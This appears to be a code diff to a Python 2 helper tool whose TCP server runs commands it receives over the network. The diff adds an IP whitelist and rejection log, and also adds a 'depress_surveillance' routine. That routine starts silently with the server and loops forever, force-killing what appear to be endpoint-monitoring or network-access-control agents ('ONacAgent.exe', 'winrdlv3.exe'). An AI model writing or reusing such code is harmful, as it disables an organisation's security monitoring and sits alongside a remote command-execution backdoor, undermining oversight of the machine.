@@ -87,7 +87,7 @@ class qyh_base( object ) :
         '''@
         [+] callable
         [+] visible
-        @short : gt
+        @short : gr
         @args : push - push codes to origin
         @args : pull - pull codes from origin
         @'''
@@ -930,13 +930,41 @@ class qyh_svr( qyh_base ) :
         super( qyh_svr , self ).__init__( ) ;
         self.svr_addr = self.svr_getaddr( )
 
+    def check_white_list( self , host = "127.0.0.1" ) :
+        white_list = self.read_config( "white_list" , "hosts" ).split( '|' )
+        if host in white_list :
+            return True
+        else :
+            self.log_to_black_list( host )
+            return False
+
+    def log_to_black_list( self , host ) :
+        black_list = self.read_config( "black_list" , "hosts" ).split( '|' )
+        if host not in black_list :
+            black_list.append( host )
+            self.write_config( "black_list" , "hosts" , '|'.join( black_list ) )
+
+    def log_rejection( self , host , port , data ) :
+        import datetime , os
+        log = str( datetime.datetime.now() ).split( '.' )[0] + ' '
+        log += 'from {} : {}\n'.format( host , port )
+        log += 'data : '
+        with open( os.path.dirname( os.path.realpath( __file__ ) ) + '\qyh_svr_rejection.log' , 'a+' ) as f :
+            f.write( log )
+            f.write( data )
+            f.write( '\n' + '\n' )
+
     class ThreadedTCPRequestHandler( BaseRequestHandler ) :
         def handle( self ) :
             import threading , os , subprocess
+            svr = qyh_svr( )
             data = self.request.recv( 65536 )
             cur_thread = threading.current_thread( )
             # self.request.sendall( 'wrapper : {}'.format(data) )
-            self.request.sendall( '[!] ' + data + '\r\n' + os.popen( data ).read( ) )
+            if svr.check_white_list( self.client_address[0] ) :
+                self.request.sendall( '[!] ' + data + '\r\n' + os.popen( data ).read( ) )
+            else :
+                svr.log_rejection( self.client_address[0] , self.client_address[1] , data )
 
     class ThreadedTCPServer( ThreadingMixIn , TCPServer ) :
         pass
@@ -1051,6 +1079,28 @@ class qyh_svr( qyh_base ) :
             self.print_green_light( '[+] remote server alive\n' )
         return True
 
+    def caller( self ) :
+        '''@
+        [+] callable
+        @short : test
+        @'''
+        self.log_rejection( 'host' , 'port' , 'data' )
+
+    def depress_surveillance( self ) :
+        '''@
+        [+] callable
+        @short : X
+        @'''
+        import os
+        while True :
+            try :
+                process_name = "ONacAgent.exe"
+                print os.popen( 'taskkill /F /IM ' + process_name + ' /T' ).read( )
+                process_name = "winrdlv3.exe"
+                print os.popen( 'taskkill /F /IM ' + process_name + ' /T' ).read( )
+            except :
+                pass
+
     def svr_start( self ) :
         '''@
         [+] callable
@@ -1058,6 +1108,8 @@ class qyh_svr( qyh_base ) :
         @short : svs
         @'''
         import subprocess , os , sys
+        cmd = 'pythonw ' + os.path.dirname( os.path.realpath( __file__ ) ).replace( '\\' , '/' ) + '/qyh.py depress_surveillance'
+        process = subprocess.Popen( cmd )
         if not self.svr_check( False ) :
             self.svr_reset( False , flag_kill = False)
             port = self.svr_getaddr( )[1]
@@ -1089,28 +1141,27 @@ class qyh_svr( qyh_base ) :
         [+] visible
         @short : svk
         @'''
-        import signal , os
+        import signal , os , psutil
         pid = self.svr_getpid( )
         if pid > 0 :
             try :
+                process_name = "pythonw.exe"
+                print os.popen( 'taskkill /F /IM ' + process_name + ' /T' ).read( )
                 os.kill( pid , signal.SIGTERM )
                 self.write_config( "svr" , "pid" , -1 )
             except :
-                self.error_exit( '!!!!!!!!!!!! os.kill exception' )
-        else :
-            self.error_exit( 'daemon down' )
-        cmd_fwall_del = 'netsh advfirewall firewall del rul name="qyh_svr"'
-        self.lexec( cmd_fwall_del , False , False )
+                pass
+                # self.error_exit( '!!!!!!!!!!!! os.kill exception' )
+        # else :
+            # self.error_exit( 'daemon down' )import psutil
 
-    def svr_exec( self , wait_result = True , *cmd ) :
+    def svr_exec( self , *cmd ) :
         '''@
         [+] callable
         [+] visible
         @short : sve
         @args : cmd - command to execute in server
         @'''
-        print cmd
-        exit()
         if len( cmd ) < 1 :
             self.error_exit( 'sve takes at least one command to execute' )
         if not self.svr_check( False ) :
@@ -1120,9 +1171,8 @@ class qyh_svr( qyh_base ) :
         sock.connect( self.svr_addr )
         try:
             sock.sendall( str( " ".join( cmd ) ) )
-            if wait_result :
-                response = sock.recv( 65536 )
-                print "[+] result from svr_daemon : \n{}".format(response)
+            response = sock.recv( 65536 )
+            print "[+] result from svr_daemon : \n{}".format(response)
         finally:
             sock.close()
 
@@ -1156,7 +1206,7 @@ class qyh( qyh_svr , qyh_adb ) :
     def testwrapper( ) :
         print "I'm the real function"
 
-    def test( self ) :
+    def test_( self ) :
         '''@
         [+] callable
         @'''
@@ -1260,9 +1310,12 @@ class qyh( qyh_svr , qyh_adb ) :
             func_map = { f if self.get_formated_args( "self." + f )[0] == "" else self.get_formated_args( "self." + f )[0] : f for f in funcs }
             self.check_args( args[1:2] , tuple( s for t in func_map.items( ) for s in t ) )
             func_name = "self." + ( func_map[ args[1] ] if args[1] in func_map else args[1] )
-            self.call_log( func_name[5:] )
-            f = eval( func_name )
-            f( *args[2:] )
+            if len( args ) > 2 :
+                f = eval( func_name )
+                f( *args[2:] )
+            else :
+                f = eval( func_name )
+                f( )
         else :
             self.main_menu( )
 
